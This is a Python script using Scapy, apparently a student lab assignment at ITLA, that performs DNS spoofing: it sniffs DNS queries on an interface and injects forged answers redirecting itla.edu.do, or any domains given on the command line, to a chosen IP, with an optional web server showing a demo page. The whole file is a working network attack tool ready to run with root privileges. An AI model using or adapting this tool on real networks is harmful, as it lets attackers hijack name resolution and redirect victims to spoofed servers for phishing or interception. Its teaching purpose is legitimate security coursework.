#!/usr/bin/env python3
# DNS Spoofing Tool | Matricula: 2023-0316 | ITLA
# Objetivo: itla.edu.do -> 20.23.3.16 (servidor web local)
# Uso: sudo python3 dns_spoofing.py -i eth0 --web

from scapy.all import *
import argparse, sys, signal, time, os
from datetime import datetime

DOMINIO = "itla.edu.do"
IP_FALSA = "20.23.3.16"
INTERFAZ = "eth0"
stats = {"interceptados": 0, "envenenados": 0, "ignorados": 0}

def servidor_web_falso(puerto=80):
    import http.server, threading
    html = f"""<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><title>ITLA - DEMO DNS SPOOFING</title>
<style>body{{font-family:Arial;background:#003366;color:white;text-align:center;padding:50px}}
.banner{{background:#cc0000;padding:20px;border-radius:10px}}
.info{{background:rgba(255,255,255,0.1);padding:15px;margin:20px auto;max-width:600px;border-radius:8px}}</style>
</head><body>
<div class="banner">
  <h1>DNS SPOOFING DEMOSTRADO</h1>
  <h2>Matricula: 2023-0316 | ITLA</h2>
</div>
<div class="info">
  <h3>Servidor Web FALSO</h3>
  <p>El dominio <strong>itla.edu.do</strong> fue redirigido aqui</p>
  <p>IP Falsa: <strong>{IP_FALSA}</strong></p>
  <p>Tecnica: DNS Spoofing / DNS Cache Poisoning</p>
  <p>Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
</div></body></html>"""

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type","text/html;charset=utf-8")
            self.end_headers()
            self.wfile.write(html.encode())
            print(f"[WEB] Conexion de {self.client_address[0]}")
        def log_message(self, *args): pass

    srv = http.server.HTTPServer(('0.0.0.0', puerto), Handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    print(f"[+] Servidor web falso en puerto {puerto} -> simula itla.edu.do")
    return srv

def respuesta_falsa(pkt, ip_falsa, dominios):
    if not pkt.haslayer(DNS) or pkt[DNS].qr != 0: return None
    query = pkt[DNS].qd.qname.decode().rstrip('.')
    stats["interceptados"] += 1
    es_obj = any(query == d or query.endswith('.'+d) for d in dominios)
    if not es_obj:
        stats["ignorados"] += 1
        return None
    print(f"\n[!] QUERY INTERCEPTADA")
    print(f"    Dominio  : {query}")
    print(f"    Desde    : {pkt[IP].src}")
    print(f"    Respuesta: {ip_falsa} (FALSA)")
    resp = (IP(src=pkt[IP].dst, dst=pkt[IP].src) /
            UDP(sport=53, dport=pkt[UDP].sport) /
            DNS(id=pkt[DNS].id, qr=1, aa=1, rd=1, ra=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname,
                          type='A', rdata=ip_falsa, ttl=300)))
    stats["envenenados"] += 1
    return resp

def modo_pasivo(iface, ip_falsa, dominios):
    print(f"[MODO] DNS Spoofing Pasivo (Sniff)")
    print(f"  Dominios : {', '.join(dominios)}")
    print(f"  IP Falsa : {ip_falsa}")
    print(f"  Interfaz : {iface}")
    print(f"\n[*] Capturando consultas DNS... (Ctrl+C para detener)\n")
    def handle(pkt):
        r = respuesta_falsa(pkt, ip_falsa, dominios)
        if r:
            send(r, iface=iface, verbose=False)
            print(f"[+] Respuesta falsa enviada")
    sniff(iface=iface, filter="udp port 53", prn=handle, store=False)

def mostrar_stats():
    print(f"\n{'='*50}")
    print(f"  ESTADISTICAS FINALES")
    print(f"  Interceptadas : {stats['interceptados']}")
    print(f"  Envenenadas   : {stats['envenenados']}")
    print(f"  Ignoradas     : {stats['ignorados']}")
    print(f"{'='*50}\n")

def main():
    print("DNS Spoofing Tool | Matricula: 2023-0316 | ITLA")
    print(f"Objetivo: {DOMINIO} -> {IP_FALSA}\n")
    p = argparse.ArgumentParser()
    p.add_argument("-i","--interfaz", default=INTERFAZ)
    p.add_argument("--ip-falsa", default=IP_FALSA)
    p.add_argument("-d","--dominios", nargs="+", default=[DOMINIO])
    p.add_argument("-m","--modo", choices=["pasivo"], default="pasivo")
    p.add_argument("--web", action="store_true")
    a = p.parse_args()

    print(f"Configuracion:")
    print(f"  Interfaz : {a.interfaz}")
    print(f"  IP Falsa : {a.ip_falsa}")
    print(f"  Dominios : {', '.join(a.dominios)}")
    print(f"  Web      : {a.web}")

    if a.web: servidor_web_falso(80)
    signal.signal(signal.SIGINT, lambda s,f: (mostrar_stats(), sys.exit(0)))
    modo_pasivo(a.interfaz, a.ip_falsa, a.dominios)
    mostrar_stats()

if __name__ == "__main__":
    if os.geteuid() != 0: sys.exit("[!] Root requerido")
    main()
